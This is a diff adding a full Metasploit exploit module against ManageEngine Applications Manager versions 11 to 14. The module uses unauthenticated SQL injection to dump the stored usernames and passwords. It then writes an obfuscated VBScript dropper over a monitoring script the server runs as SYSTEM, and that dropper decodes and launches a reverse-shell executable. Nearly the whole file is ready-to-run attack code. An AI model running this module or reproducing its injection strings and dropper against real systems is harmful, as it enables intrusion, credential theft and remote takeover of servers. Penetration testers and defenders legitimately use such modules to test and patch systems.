@@ -1,0 +1,213 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => "ManageEngine Applications Manager 11.0 < 14.0 SQL Injection / Remote Code Execution",
+      'Description'    => %q(
+        This module exploits sql and command injection vulnerability in the ManageEngine AM 14 and prior versions.
+        An unauthenticated user can gain the authority of "system" on the server due to SQL injection vulnerability.
+        Exploit allows the writing of the desired file to the system using the postgesql structure.
+        Module is written over the payload by selecting a file with the extension ".vbs" that is used for monitoring 
+        by the ManageEngine which working with "system" authority.
+
+        In addition, it dumps the users and passwords from the database for us.
+        Keep in mind! After the harmful ".vbs" file is written, the shell session may be a bit late.
+        Because the ManageEngine application should run this file itself.
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'AkkuS <Özkan Mustafa Akkuş>', # Discovery & PoC & Metasploit module @ehakkus
+        ],
+      'References'     =>
+        [
+          ['URL', 'https://pentest.com.tr/exploits/ManageEngine-App-Manager-14-SQLi-Remote-Code-Execution.html']
+        ],
+      'DefaultOptions' =>
+        {
+          'WfsDelay' => 500,
+          'PAYLOAD' => 'windows/shell_reverse_tcp',
+          'RPORT' => 8443,
+          'SSL' => true
+        },
+      'Payload' =>
+        {
+          'Encoder' => 'x86/shikata_ga_nai'
+        },
+      'Platform'       => ['win'],
+      'Arch'           => [ARCH_X86, ARCH_X64],
+      'Targets'        =>
+        [
+           ['AppManager 14', {}],
+           ['AppManager 13', {}],
+           ['AppManager 12', {}],
+           ['AppManager 11', {}]
+        ],
+      'Privileged'     => true,
+      'DisclosureDate' => 'Apr 17 2019',
+      'DefaultTarget'  => 1))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The URI of the application', '/'])
+      ]
+    )
+  end
+##
+# Check exploit vulnerability basically // 'Appears' more convenient
+##
+  def check
+    res = inject(Rex::Text.rand_text_alpha(1))
+
+    if res.code = "200" && res.headers['set-cookie'] =~ /JSESSIONID/
+      Exploit::CheckCode::Appears
+    else
+      Exploit::CheckCode::Safe
+    end
+  end
+##
+# VBS payload and Post Data preparation
+##
+  def get_payload
+
+    handler
+    payload = generate_payload_exe
+    @vbs_content = Msf::Util::EXE.to_exe_vbs(payload)
+    ## determining the target directory
+    if target.name == 'AppManager 14'
+      tfile = "AppManager14"
+    elsif target.name == 'AppManager 13'
+      tfile = "AppManager13"
+    elsif target.name == 'AppManager 12'
+      tfile = "AppManager12"
+    elsif target.name == 'AppManager 11'
+      tfile = "AppManager11"
+    end
+
+    fhashes = Rex::Text.rand_text_alpha_lower(8) + ".txt"
+    ## parameters required to read the user table
+    hashes = "sid=1;copy+(select+username,password+from+AM_UserPasswordTable)+to+$$"
+    hashes << "c:\\Program+Files+(x86)\\ManageEngine\\"
+    hashes << "#{tfile}"
+    hashes << "\\working\\"
+    hashes << "#{fhashes}"
+    hashes << "$$;--"
+
+    res = inject("#{hashes}")
+
+    if res.code = "200" && res.headers['set-cookie'] =~ /JSESSIONID/
+      print_good("Users in the database were taken...")
+      res = send_request_cgi({
+        'method'   => 'GET',
+        'uri'      => normalize_uri(target_uri.path, "#{fhashes}") # users file url
+      })
+
+      if res.code == "404"
+       fail_with(Failure::Unreachable, 'The database could not be read!')
+      else
+       print_status("--------------------Usernames and Passwords---------------------")
+       puts res.body # users table output
+       print_status("----------------------------------------------------------------") 
+      end 
+    else
+      fail_with(Failure::Unreachable, 'Connection error occurred!')
+    end
+
+    ## fetch base64 part in vbs payload
+    pb64 = @vbs_content.split('"
+	Dim')[0].split(' = "')[2]
+    ## vbs file in one line
+    vbs_file = 'On Error Resume Next:Set objWbemLocator = CreateObject("WbemScripting.SWbemLocator"):'
+    vbs_file << 'if Err.Number Then:WScript.Echo vbCrLf & "Error # " & " " & Err.Description:End If:O'
+    vbs_file << 'n Error GoTo 0:On Error Resume Next:Select Case WScript.Arguments.Count:Case 2:strCo'
+    vbs_file << 'mputer = Wscript.Arguments(0):strQuery = Wscript.Arguments(1):Set wbemServices = obj'
+    vbs_file << 'WbemLocator.ConnectServer (strComputer,"Root\\CIMV2"):Case 4:strComputer = Wscript.A'
+    vbs_file << 'rguments(0):strUsername = Wscript.Arguments(1):strPassword = Wscript.Arguments(2):st'
+    vbs_file << 'rQuery = Wscript.Arguments(3):Set wbemServices = objWbemLocator.ConnectServer (strCo'
+    vbs_file << 'mputer,"Root\\CIMV2",strUsername,strPassword):case 6:strComputer = Wscript.Arguments'
+    vbs_file << '(0):strUsername = Wscript.Arguments(1):strPassword = Wscript.Arguments(2):strQuery ='
+    vbs_file << ' Wscript.Arguments(4):namespace = Wscript.Arguments(5):Set wbemServices = objWbemLoca'
+    vbs_file << 'tor.ConnectServer (strComputer,namespace,strUsername,strPassword):Case Else:strMsg ='
+    vbs_file << ' "Error # in parameters passed":WScript.Echo strMsg:WScript.Quit(0):End Select:Set w'
+    vbs_file << 'bemServices = objWbemLocator.ConnectServer (strComputer, namespace, strUsername, str'
+    vbs_file << 'Password):if Err.Number Then:WScript.Echo vbCrLf & "Error # "  & " " & Err.Descriptio'
+    vbs_file << 'n:End If:On Error GoTo 0:On Error Resume Next:Set colItems = wbemServices.ExecQuery(s'
+    vbs_file << 'trQuery):if Err.Number Then:WScript.Echo vbCrLf & "Error # "  & " " & Err.Description'
+    vbs_file << ':End If:On Error GoTo 0:i=0:For Each objItem in colItems:if i=0 then:header = "":For '
+    vbs_file << 'Each param in objItem.Properties_:header = header & param.Name & vbTab:Next:WScript.E'
+    vbs_file << 'cho header:i=1:end if:serviceData = "":For Each param in objItem.Properties_:serviceD'
+    vbs_file << 'ata = serviceData & param.Value & vbTab:Next:WScript.Echo serviceData:Next:Function b'
+    vbs_file << 'PBdVfYpfCEHF(hBPVZMitxq):HHgwqsqii = "<B64DECODE xmlns:dt="& Chr(34) & "urn:schemas-m'
+    vbs_file << 'icrosoft-com:datatypes" & Chr(34) & " " & "dt:dt=" & Chr(34) & "bin.base64" & Chr(34)'
+    vbs_file << ' & ">" & hBPVZMitxq & "</B64DECODE>":Set TInPBSeVlL = CreateObject("MSXML2.DOMDocument'
+    vbs_file << '.3.0"):TInPBSeVlL.LoadXML(HHgwqsqii):bPBdVfYpfCEHF = TInPBSeVlL.selectsinglenode("B64D'
+    vbs_file << 'ECODE").nodeTypedValue:set TInPBSeVlL = nothing:End Function:Function txhYXYJJl():Emkf'
+    vbs_file << 'dMDdusgGha = "'
+    vbs_file << "#{pb64}"
+    vbs_file << '":Dim CCEUdwNSS:Set CCEUdwNSS = CreateObject("Scripting.FileSystemObject"):Dim zhgqIZn'
+    vbs_file << 'K:Dim gnnTqZvAcL:Set zhgqIZnK = CCEUdwNSS.GetSpecialFolder(2):gnnTqZvAcL = zhgqIZnK & '
+    vbs_file << '"\" & CCEUdwNSS.GetTempName():CCEUdwNSS.CreateFolder(gnnTqZvAcL):yZUoLXnPic = gnnTqZvAc'
+    vbs_file << 'L & "\" & "SAEeVSXQVkDEIG.exe":Dim mEciydMZTsoBmAo:Set mEciydMZTsoBmAo = CreateObject("'
+    vbs_file << 'Wscript.Shell"):LXbjZKnEQUfaS = bPBdVfYpfCEHF(EmkfdMDdusgGha):Set TUCiiidRgJQdxTl = Cre'
+    vbs_file << 'ateObject("ADODB.Stream"):TUCiiidRgJQdxTl.Type = 1:TUCiiidRgJQdxTl.Open:TUCiiidRgJQdxT'
+    vbs_file << 'l.Write LXbjZKnEQUfaS:TUCiiidRgJQdxTl.SaveToFile yZUoLXnPic, 2:mEciydMZTsoBmAo.run yZU'
+    vbs_file << 'oLXnPic, 0, true:CCEUdwNSS.DeleteFile(yZUoLXnPic):CCEUdwNSS.DeleteFolder(gnnTqZvAcL):E'
+    vbs_file << 'nd Function:txhYXYJJl:WScript.Quit(0)'
+    ## encode the vbs file to base64 and then encode the url-hex
+    encoding_vbs = Rex::Text.uri_encode(Rex::Text.encode_base64(vbs_file), 'hex-all')
+
+    ## post preparation // creating and writing files on the server with SQLi
+    vbs_payload = "sid=1;copy+(select+convert_from(decode($$#{encoding_vbs}$$,$$base64$$)"
+    vbs_payload << ",$$utf-8$$))+to+$$C:\\\\Program+Files+(x86)\\\\ManageEngine\\\\"
+    vbs_payload << "#{tfile}"
+    vbs_payload << "\\\\working\\\\conf\\\\application\\\\scripts\\\\wmiget.vbs$$;"
+
+    res = inject("#{vbs_payload}")
+
+    if res.code = "200" && res.headers['set-cookie'] =~ /JSESSIONID/
+      print_good("The harmful .vbs file was successfully written to the server.")
+      print_status("Keep in mind! You may have to wait between 10-300 seconds for the shell session.")
+    else
+      fail_with(Failure::Unreachable, 'Connection error occurred!')
+    end
+
+    return payload
+  end
+##
+# Call functions
+##
+  def exploit
+    unless Exploit::CheckCode::Appears == check
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
+    end
+    print_status("Payload is preparing...")
+    get_payload
+
+  end
+##
+# Inj payload
+##
+  def inject(payload)
+
+    res = send_request_cgi(
+      {
+      'method' => 'POST',
+      'ctype'  => 'application/x-www-form-urlencoded',
+      'uri' => normalize_uri(target_uri.path, '/jsp/Popup_SLA.jsp'),
+      'data' => payload
+      }, 25)
+    
+  end
+end
+##
+# The end of the adventure (o_O) // AkkuS
+##
